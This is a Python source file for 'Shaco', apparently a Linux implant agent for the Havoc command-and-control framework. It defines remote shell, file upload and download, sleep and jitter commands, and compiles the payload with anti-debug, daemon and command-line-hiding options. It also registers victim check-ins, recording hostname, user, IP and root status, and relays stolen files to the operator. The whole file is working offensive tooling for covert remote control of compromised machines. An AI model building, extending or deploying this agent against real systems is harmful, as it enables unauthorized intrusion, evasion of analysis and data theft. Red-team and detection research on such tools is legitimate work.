#!/bin/python3
from traceback import print_exc
from havoc.agent import AgentType, Command, CommandParam, MessageType
from havoc.service import HavocService
from Protocol.python.Packer import Packer, Parser
from base64 import b64decode
from shutil import which, rmtree
from os import makedirs, path
from traceback import print_exc

import random
import string
import subprocess

COMMAND_OK = 13
COMMAND_GET = 14
COMMAND_OUTPUT = 15
COMMAND_NO_JOB = 16
COMMAND_ERR = 17
COMMAND_CHECKIN = 12

COMMAND_SHELL = 90
COMMAND_UPLOAD = 93
COMMAND_CD = 91
COMMAND_PWD = 92
COMMAND_EXIT = 94
COMMAND_SLEEP = 95
COMMAND_JITTER = 96
COMMAND_DOWNLOAD = 97

RESPONSE_UPLOAD_SUCCESS = 1
RESPONSE_DOWNLOAD_SUCCESS = 1
RESPONSE_UPLOAD_ERROR = 2
RESPONSE_DOWNLOAD_ERROR = 2
RESPONSE_DOWNLOAD_NO_VALUE = 3

def random_str( value : int):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=value))

class CommandExit(Command):
    CommandId = COMMAND_EXIT
    Name = "exit"
    Description = ""
    Help = "exit"
    NeedAdmin = False
    Params = []
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        return Task.get_buffer()

class CommandSleep(Command):
    CommandId = COMMAND_SLEEP
    Name = "sleep"
    Description = "change sleep duration"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name = 'time',
            is_file_path = False,
            is_optional = False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_int32( int(arguments['time']) )
        return Task.get_buffer()

class CommandJitter(Command):
    CommandId = COMMAND_JITTER
    Name = "jitter"
    Description = "change max timeout duration: jitter = random_int(sleep, sleep+maxtimeout)"
    Help = "jitter <time>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name = 'time',
            is_file_path = False,
            is_optional = False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_int32( int(arguments['time']) )
        return Task.get_buffer()

class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using shell"
    Help = "shell <command>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="command",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['T1059.004']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments['command'] )
        return Task.get_buffer()

class CommandDownload(Command):
    CommandId = COMMAND_DOWNLOAD
    Name = "download"
    Description = "download file of agent"
    Help = "download <remotefile>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="remotefile",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments['remotefile'].strip() )
        return Task.get_buffer()

class CommandUpload(Command):
    CommandId = COMMAND_UPLOAD
    Name = "upload"
    Description = "upload file to agent. Don't try upload > 7k"
    Help = "upload <localfile> <remote put file>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="localfile",
            is_file_path=True,
            is_optional=False
        ),
        CommandParam(
            name="remotefile",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        

        file = arguments['localfile'].encode()

        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_uint64( len(file))
        Task.add_str( arguments['remotefile'] )
        Task.add_data64( file  )
        return Task.get_buffer()

class CommandCheckin(Command):
    CommandId = COMMAND_CHECKIN
    Name = "checkin"
    Description = "agent checkin"
    Help = "checkin"
    NeedAdmin = False
    Params = []
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        return Task.get_buffer()

class CommandPwd(Command):
    CommandId = COMMAND_PWD
    Name = "pwd"
    Description = "get current directory"
    Help = "pwd"
    NeedAdmin = False
    Params = []

    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        return Task.get_buffer()

class CommandCd(Command):
    CommandId = COMMAND_CD
    Name = "cd"
    Description = "change direcroty"
    Help = "cd <path>"
    NeedAdmin = False
    Params = [
        CommandParam(
            name="command",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = ['']

    def job_generate( self, arguments: dict ) -> bytes:        
        Task = Packer()
        Task.add_int32( self.CommandId )
        Task.add_str( arguments[ 'command' ].strip() )
        return Task.get_buffer()

class Shaco(AgentType):
    Name = "Shaco"
    Author = "@souzomain"
    Version = "0.1"
    Description = f"""Shaco payload, version: {Version}"""
    MagicValue = 0x6861636f

    Arch = [
        "x64",
        "x86",
        'arm'
    ]
    
    Formats = [
        {
            "Name": "Linux Executable",
            "Extension": "elf"
        },
        {
            'Name': 'Linux Shared Library',
            'Extension': 'so'
        }
        #{
        # "Name": "MacOS",
            #    "Extension": 'macho'
            #},
    ]
    
    BuildingConfig = {
        'Sleep': '5',
        'MaxTimeout': '0',
        'AntiDebug': True,
        'Daemon': True,
        'HideCmdline': True
    }

    Commands = [
        CommandShell(),
        CommandCd(), 
        CommandPwd(),
        CommandUpload(),
        CommandDownload(),
        CommandCheckin(),
        CommandExit(),
        CommandSleep(),
        CommandJitter()
    ]

    def generate(self, config:dict) -> None:
        print(config)

        tmppath = "/tmp/shaco_agent_generation"
        cliid = config['ClientID']
        flags = ''
        file = 'shaco'

        try:
            self.builder_send_message(cliid, MessageType.Info, "initializing")
            if not which("cmake"):
                self.builder_send_message(cliid, MessageType.Error, "cmake not found")
                return
            if not which("make"):
                self.builder_send_message(cliid, MessageType.Error, "make not found")
                return
            if not which("clang"):
                self.builder_send_message(cliid, MessageType.Error, "compiler not found")
                return
            if not path.exists('./CMakeLists.txt'):
                self.builder_send_message(cliid, MessageType.Error, "CMakeLists not found")
                return
            if not path.exists('./Config/Settings.c'):
                self.builder_send_message(cliid, MessageType.Error, "Config File not found")
                return

            original_cfg_data = ''
            with open('./Config/Settings.c', 'r') as cfg:
                original_cfg_data = cfg.read()

            supported_arch = [ 'x86', 'x64', 'arm' ]
            config_vars = ['%IP%', '%ENDPOINT%', '%DOMAIN%', '%USERAGENT%', '%TIMEOUT%', '%PORT%', '%MAXTIMEOUT%']
            cfg_data = ''

            if not all(var in original_cfg_data for var in config_vars):
                self.builder_send_message(cliid, MessageType.Error, "Config File error, parameters not found")
                return
            
            if int(config['Config']['Sleep']) <= 0:
                self.builder_send_message(cliid, MessageType.Error, "Sleep has to be greater than 0")
                return

            if int(config['Config']['MaxTimeout']) < 0:
                self.builder_send_message(cliid, MessageType.Error, "MaxTimeout negative is not valid")
                return

            if not config['Options']['Arch'] in supported_arch:
                self.builder_send_message(cliid, MessageType.Error, "Unsupported architecture")
                return


            uris = config['Options']['Listener']['Uris']
            uri = '/' if uris is None else uris[0]
            if uri == '':
                uri = '/'

            if config['Config']['AntiDebug']:
                flags += '-DAntiDebug=ON '

            if config['Config']['Daemon']:
                flags += '-DDaemon=ON '

            if config['Config']['HideCmdline']:
                flags += '-DHIDE_CMDLINE=ON '

            if config['Options']['Format'] == 'Linux Shared Library':
                self.builder_send_message(cliid, MessageType.Info, "Compiling Shared Library")
                flags += '-DCOMPILE_LIB=ON '
                file = 'libshaco.so'

            architecture = config['Options']['Arch']
            flags += f'-DCOMPILE_ARCH={architecture} '

            flags += '-DCMAKE_BUILD_TYPE=Release '

            port = config['Options']['Listener']['PortConn']
            if port == '':
                port = config['Options']['Listener']['PortBind']

            ip =  config['Options']['Listener']['HostBind']
            domain = config['Options']['Listener']['Hosts'][0]
            useragent = config['Options']['Listener']['UserAgent']
            sleep =  config['Config']['Sleep']
            jitter = config['Config']['MaxTimeout']

            cfg_data = original_cfg_data.replace('%IP%', ip)
            cfg_data = cfg_data.replace('%ENDPOINT%', uri)
            cfg_data = cfg_data.replace('%DOMAIN%', domain)
            cfg_data = cfg_data.replace('%USERAGENT%', useragent)
            cfg_data = cfg_data.replace('%TIMEOUT%', sleep)
            cfg_data = cfg_data.replace('%MAXTIMEOUT%', jitter)
            cfg_data = cfg_data.replace('%PORT%', port)

            try:
                with open('./Config/Settings.c', 'w') as cfg:
                    cfg.write(cfg_data)
    
                if path.exists(tmppath):
                    print(f"Removing {tmppath}")
                    rmtree(tmppath)

                print(f"Creating path {tmppath}")
                makedirs(tmppath, exist_ok=True)
                
                print("Executing cmake compile command")
                out = subprocess.check_output(f'cmake -S . -B {tmppath} {flags}', shell=True, stderr=subprocess.STDOUT)

                print("sending data to client")
                self.builder_send_message(cliid, MessageType.Info, out.strip().decode())

                out = subprocess.check_output(f'make -C {tmppath}', shell=True, stderr=subprocess.STDOUT)

                self.builder_send_message(cliid, MessageType.Info, out.strip().decode())

                with open(f'{tmppath}/{file}', 'rb') as f:
                    self.builder_send_message(cliid, MessageType.Good, 'Sending compiled shaco!')
                    self.builder_send_payload(cliid, file, f.read())

            except subprocess.CalledProcessError as ex:
                self.builder_send_message(cliid, MessageType.Error, f'An error ocurred on Compiling:\n{ex.output.decode()}')
                print(ex.output.decode())
                print(ex.stderr)
            except Exception as ex:
                self.builder_send_message(cliid, MessageType.Error, f'Error in compilation {str(ex)}')
                print_exc()
                return
            finally:
                with open('./Config/Settings.c' ,'w') as cfg:
                    cfg.write(original_cfg_data)

        except Exception as ex:
            print(f"Error in generate: {str(ex)}")
            self.builder_send_message(cliid, MessageType.Error, f"Error on generate: {str(ex)}")
            print_exc()

        print('Exiting generate')

    def response(self, havoc_response: dict):
        agent_response = b64decode(havoc_response['Response'])
        parser  = Parser(agent_response)
        command = parser.get_int32()
        agent = havoc_response['Agent']
        agentid = havoc_response['AgentHeader']['AgentID']

        if command == COMMAND_CHECKIN:
            print("new command register request")

            RegisterInfo = {
                "AgentID"           : parser.get_int32(),
                "Hostname"          : parser.get_str(),
                "Username"          : parser.get_str(),
                "Domain"            : parser.get_str(),
                "InternalIP"        : parser.get_str(),
                "Process Path"      : "/",
                "Process ID"        : str(parser.get_int32()),
                "Process Parent ID" : str(parser.get_int32()),
                "Process Arch"      : parser.get_str(),
                "Process Name"      : "shaco",
                "Process Elevated"  : parser.get_int32(),
                "OS Version"        : parser.get_str(),
                "OS Build"          : "1.1.1",
                "OS Arch"           : "1.1.1",
                "Sleep"             : parser.get_int32(),
            }

            self.register(havoc_response['AgentHeader'], RegisterInfo)
            self.console_message(agentid, MessageType.Good, 'new checkin', 
f"""
AgentID:     \t{RegisterInfo['AgentID']}
Username:    \t{RegisterInfo['Username']}
Hostname:    \t{RegisterInfo['Hostname']}
Domain:      \t{RegisterInfo['Domain']}
Version:     \t{RegisterInfo['OS Version']}
Internal IP: \t{RegisterInfo['InternalIP']}
Is root:     \t{RegisterInfo['Process Elevated']}
Sleep:       \t{RegisterInfo['Sleep']}
Jitter:      \t{parser.get_int32()}
""")

            pack = Packer()
            pack.add_int32(COMMAND_OK)
            return pack.get_buffer()

        if agent == None:
            print("send agent checkin request")
            pack = Packer()
            pack.add_int32(COMMAND_CHECKIN)
            return pack.get_buffer()

        elif command == COMMAND_GET:
            agentid = havoc_response['Agent']['NameID']
            tasks = self.get_task_queue(agent)
            pack = Packer()
            if len(tasks) == 0:
                print('No task')
                pack.add_int32(COMMAND_NO_JOB)
                return pack.get_buffer()
            else:
                print('Returning task to agent')
                return tasks

        elif command == COMMAND_OUTPUT:
            cmdid = parser.get_int32()
            try:
                if cmdid == COMMAND_UPLOAD:
                    ok = Parser(parser.get_data()).get_int32()
                    if ok == RESPONSE_UPLOAD_SUCCESS:
                        self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "uploaded file to the host")
                    else:
                        self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "can't upload the file")
                elif cmdid == COMMAND_DOWNLOAD:
                    ok = Parser(parser.get_data())
                    v_res = ok.get_int32()
                    if v_res == RESPONSE_DOWNLOAD_SUCCESS:
                        size = ok.get_uint64()
                        file = ok.get_data64()
                        self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "Received file from shaco agent")
                        self.download_file(agentid, random_str(10), size, file)
                    elif v_res == RESPONSE_DOWNLOAD_NO_VALUE:
                        self.console_message(agentid, MessageType.Info, 'Shaco Output: ', "The file has no output")
                    else:
                        self.console_message(agentid, MessageType.Error, 'Shaco Output: ', "can't download the file")
                else:
                    raw = parser.get_data()
                    rawdec = Parser(raw)
                    out = rawdec.get_data()
                    self.console_message(agentid, MessageType.Good, 'Shaco Output: ', out.decode())
            except Exception as ex:
                print(f"Error on send message to operator: {str(ex)}")
                print_exc()
                self.console_message(agentid, MessageType.Error, 'Shaco Error: ', f"Error in output from command {cmdid}")

        print("Command not found")
        pack = Packer()
        pack.add_int32(COMMAND_ERR)
        return pack.get_buffer()

def main():
    Havoc_Shaco = Shaco()
    Havoc_Service = HavocService(
        endpoint=f"wss://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )
    Havoc_Service.register_agent(Havoc_Shaco)

if __name__ == '__main__':
    main()
